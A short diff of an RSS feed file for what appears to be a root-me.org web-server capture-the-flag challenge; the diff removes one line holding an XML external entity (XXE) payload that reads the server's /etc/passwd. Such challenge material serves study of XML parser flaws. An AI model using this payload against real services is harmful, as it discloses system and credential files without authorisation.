@@ -1,5 +1,4 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
 <channel>
     <title>The Blog</title>
     <link>http://challenge01.root-me.org/web-serveur/ch29/index.php</link>
